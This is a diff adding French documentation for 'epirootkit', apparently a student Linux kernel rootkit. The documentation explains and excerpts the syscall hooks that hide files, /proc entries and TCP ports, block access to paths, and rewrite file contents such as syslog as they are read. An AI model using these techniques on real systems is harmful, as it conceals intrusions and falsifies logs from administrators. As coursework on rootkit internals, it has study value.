@@ -253,11 +253,171 @@ Le fichier `init.c` est appelé dès l’insertion du rootkit et permet de gére
 
 ## 4. 🪝 Hooks
 
-### 4.1
+### 4.1 👻 hide
 
-La partie hide du rootkit est chargée de masquer deux catégories principales d’éléments au sein du système :
+La partie *hide* du rootkit est chargée de masquer deux catégories principales d’éléments au sein du système : les fichiers et répertoires (interception de `getdents64`), ainsi que les ports TCP (interception de `tcp4_seq_show`, `tcp6_seq_show`, et `recvmsg`)
 
+#### 4.1.1 Structures
 
+Le mécanisme de masquage s’appuie sur deux instances de la structure `ulist` (définie dans le dossier `utils/ulist`). Ces listes sont déclarées et initialisées dans `hide_api.c`, à partir de deux fichiers de configuration dont les chemins sont définis au moment de la compilation. Ensuite, différentes fonctions permettent d’interagir avec ces listes, qui peuvent ainsi stocker les fichiers et ports à altérer via l’interception des appels système.
+- `struct ulist hide_list` : liste des chemins (fichiers/répertoires) à cacher.
+- `struct ulist hide_port_list` : liste des ports TCP à cacher.
+
+```c
+int hide_init(void);
+void hide_exit(void);
+int hide_file(const char *path);
+int unhide_file(const char *path);
+int hide_contains_str(const char *u_path);
+int hide_list_get(char *buf, size_t buf_size);
+
+int hide_port_init(void);
+void hide_port_exit(void);
+int hide_port(const char *port);
+int unhide_port(const char *port);
+int port_contains(const char *port);
+int port_list_get(char *buf, size_t buf_size);
+```
+
+#### 4.1.2 Interception
+
+Le fichier `hide.c` contient l’ensemble des hooks gérés, et donc la déclaration des pointeurs vers les fonctions noyau d’origine.
+```c
+asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
+asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
+asmlinkage long (*__orig_tcp6_seq_show)(struct seq_file *seq, void *v) = NULL;
+asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs) = NULL;
+```
+Pour ce qui est de l’appel système `getdents64`, il est utilisé par la plupart des appels de type `readdir()` ou `ls` et permet de lister dans un buffer l’ensemble des entrées d’un répertoire. L’interception de cet appel et sa redirection vers la fonction `getdents64_hook` nous permettent ainsi de masquer spécifiquement certains fichiers et répertoires. Ce hook est notamment utilisé pour dissimuler des dossiers de processus dans `/proc/`, comme ceux liés aux threads de communication réseau pour les protocoles DNS et TCP. Il est aussi utile pour cacher les fichiers liés à la persistance du rootkit ainsi que ceux relatifs aux éléments de configuration dans `/var/lib/systemd/.epirootkit-hidden-fs`.
+```bash
+victim@victim$ strace ls
+execve("/sbin/ls", ["ls"], 0x7ffe4be49b00 /* 106 vars */) = 0
+...
+fstat(3, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+getdents64(3, 0x5bb6802fc6f0 /* 13 entries */, 32768) = 376
+getdents64(3, 0x5bb6802fc6f0 /* 0 entries */, 32768) = 0
+close(3) = 0
+...
+```
+Par ailleurs, les fonctions `tcp4_seq_show_hook` et `tcp6_seq_show_hook` interceptent respectivement l’affichage des entrées dans `/proc/net/tcp` et `/proc/net/tcp6`. En les détournant, il devient possible de masquer certaines connexions réseau et sockets ouverts, en fonction de ports source/destination spécifiés. Ces deux fonction sont d'ailleurs exportées dans la table de symboles du noyau (`/proc/kallsyms`), ce qui signifie qu’il est bien possible, au chargement du module, de récupérer leur adresse exacte en mémoire au moyen d’un appel à `kallsyms_lookup_name()`.
+```bash
+victim@victim$ cat /proc/kallsyms | grep tcp[46]_seq_show
+0000000000000000 t __pfx_tcp4_seq_show
+0000000000000000 t tcp4_seq_show
+0000000000000000 t __pfx_tcp6_seq_show
+0000000000000000 t tcp6_seq_show
+```
+Enfin, l’interception de la fonction `recvmsg` permet de filtrer les dumps Netlink utilisés par des outils comme `ss`, `netstat`, etc.
+Ces programmes n’accèdent pas directement aux fichiers mentionnés précédemment, mais communiquent via une socket Netlink de type `NETLINK_SOCK_DIAG`. Ainsi, pour masquer également ces connexions, la fonction `recvmsg_hook` intercepte l’appel système `recvmsg`, vérifie si la socket utilisée est bien de type `netlink-diag`, puis teste si les ports source ou destination figurent dans notre liste de ports à cacher `hide_port_list`. Le port **4242** est caché par défaut.
+
+### 4.2 🚫 forbid
+
+La partie *forbid* du rootkit a pour objectif d’interdire l’accès à certains fichiers ou répertoires. Concrètement, elle intercepte les appels systèmes de type openat, stat (et variantes), et chdir pour renvoyer une erreur dès qu’un chemin à *interdire* est détecté. Les fichiers par défaut incluent notamment les fichiers de configuration ainsi que les répertoires liés à la persistance.
+
+#### 4.2.1 Structures
+
+Le mécanisme de filtrage repose sur une unique instance de la structure ulist, définie dans `utils/ulist`, exactement comme précédemment... Cette liste conserve, sous forme de chaînes de chemins absolus, tous les fichiers ou répertoires auxquels on souhaite interdire l’accès. Les fonctions exposées dans `forbid_api.h` permettent de gérer dynamiquement cette liste :
+```c
+int forbid_init(void);
+void forbid_exit(void);
+int forbid_file(const char *path);
+int unforbid_file(const char *path);
+int forbid_contains(const char __user *u_path);
+int forbid_list_get(char *buf, size_t buf_size);
+```
+
+#### 4.2.2 Interception
+
+Toutes les interceptions sont déclarées et implémentées dans `forbid.c`. On y trouve, dans un premier temps, les pointeurs vers les fonctions noyau d’origine, qui seront sauvegardés au moment de l’installation des hooks.
+```c
+asmlinkage long (*__orig_openat)(const struct pt_regs *) = NULL;
+asmlinkage long (*__orig_newfstatat)(const struct pt_regs *) = NULL;
+asmlinkage long (*__orig_fstat)(const struct pt_regs *) = NULL;
+asmlinkage long (*__orig_lstat)(const struct pt_regs *) = NULL;
+asmlinkage long (*__orig_stat)(const struct pt_regs *) = NULL;
+asmlinkage long (*__orig_chdir)(const struct pt_regs *regs) = NULL;
+asmlinkage long (*__orig_ptrace)(const struct pt_regs *regs) = NULL;
+```
+
+Pour ce qui est de la fonction `openat` (appelée via `sys_openat`), elle est utilisée pour ouvrir un fichier ou créer un lien. Dans notre hook, on récupère l’argument `pathname` passé par l’espace utilisateur depuis le registre `regs->si`.
+```c
+asmlinkage long notrace openat_hook(const struct pt_regs *regs) {
+    const char __user *u_path = (const char __user *)regs->si;
+    if (forbid_contains(u_path))
+        return -ENOENT;
+    return __orig_openat(regs);
+}
+```
+Ainsi, si le chemin est interdit, le hook renvoie `-ENOENT`, ce qui fait croire au processus qu’il n’existe pas ! Dans le cas contraire, on invoque ici `__orig_openat(regs)` pour ouvrir le fichier normalement.
+```bash
+root@victim# cat /etc/secret.conf
+cat: /etc/secret.conf: No such file or directory
+```
+Par ailleurs, de nombreux utilitaires reposent sur la famille d’appels systèmes `stat`, `lstat`, `fstat` et `newfstatat` pour obtenir les métadonnées d’un fichier (permissions, taille, propriétaire, etc.). Plutôt que d’installer quatre hooks séparés, nous avons regroupé l’interception de ces quatre appels dans une unique fonction `stat_hook`, qui examine `orig_ax` pour rediriger vers la fonction d’origine appropriée dans la fonction `stat_hook(const struct pt_regs *regs)`. Enfin, l’appel système `chdir` permet à un processus de changer son répertoire de travail courant. Si l’on veut empêcher un utilisateur ou un script de s’avancer dans un dossier jugé sensible, on intercepte aussi `chdir` et on bloque le changement de dossier dès que le chemin se trouve dans la liste `forbid_list`.
+```c
+asmlinkage long notrace chdir_hook(const struct pt_regs *regs) {
+    const char __user *u_path = (const char __user *)regs->di;
+    if (forbid_contains(u_path))
+        return -ENOENT;
+    return __orig_chdir(regs);
+}
+```
+
+### 4.3 🧬 alterate
+
+La partie alterate du rootkit permet de modifier à la volée le contenu des fichiers lus par un processus, en se basant sur des règles définies pour chaque chemin. Dès qu’un appel à `read` est intercepté sur un file descriptor dont le chemin figure dans la liste des fichiers à altérer, on peut soit masquer une ligne précise, soit masquer toute ligne contenant un certain mot clef, ou soit remplacer une sous-chaîne par une autre dans chaque ligne retournée. Cette fonctionnalité est dynamique, mais doit être utilisée avec précaution, car il n’est pas toujours garanti que les éléments basés sur les numéros de ligne fonctionnent de manière fiable.
+
+#### 4.3.1 Structures
+
+Le cœur du mécanisme d’alteration repose sur la structure `alt_list`, définie et gérée dans `alterate_api.c`. Cette liste stocke les chemins des fichiers à surveiller, associée à un payload textuel codant la règle d’altération. Chaque élément de `alt_list` correspond à un enregistrement de configuration dont la clé (`value`) est le chemin absolu du fichier, et dont le payload est une chaîne au format suivant :
+```bash
+<path>|<flags>|<numero_de_ligne>:<mot_clef_a_masquer_lol>:<src_substr>:<dst_substr>
+```
+En effet, un élément de liste dans `ulist.c` a la structure suivante :
+```bash
+struct ulist_item {
+    char *value;
+    u32 flags;
+    char *payload;
+    struct list_head list;
+};
+```
+Ainsi par exemple, si la ligne de configuration contient :
+```bash
+/var/log/syslog|0|10:claire:efrei:epita
+```
+On aura dans le fichier `/var/log/syslog` (avec un certes un flag de 0, mais que finalement nous n'utilisons jamais...) :
+- La dixième ligne sera cachée.
+- Toutes les lignes contenant le mot *claire* disparaîtront.
+- Toutes les occurrences de *efrei* seront remplacées par *epita*.
+
+Le fichier `alterate_api.h` expose par ailleurs l’API de gestion de cette configuration :
+```c
+int alterate_init(void);
+void alterate_exit(void);
+int alterate_add(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst);
+int alterate_remove(const char *path);
+int alterate_contains(const char __user *u_path);
+int alterate_list_get(char *buf, size_t buf_size);
+```
+#### 4.3.2 Interception
+
+Le fichier alterate.c implémente l’intégralité de la logique d’interception de `read` par la fonction `read_hook(const struct pt_regs *regs)`. La fonction de hook n’est ni très élégante ni optimisée, car le parsing répétitif de la liste introduit peut-être une complexité inutile.
+```c
+    char *dup = kstrdup(rule_payload, GFP_KERNEL);
+    if (!dup)
+        return ret;
+    char *fld[4] = { NULL, NULL, NULL, NULL };
+    int i;
+    for (i = 0; i < 3; i++)
+        fld[i] = strsep(&dup, ":");
+    fld[3] = dup;
+
+    int hide_line = simple_strtol(fld[0], NULL, 10);
+    char *hide_substr = fld[1][0] ? fld[1] : NULL;
+    char *src = fld[2][0] ? fld[2] : NULL;
+    char *dst = fld[3][0] ? fld[3] : NULL;
+```
 
 <img 
   src="logo_no_text.png" 
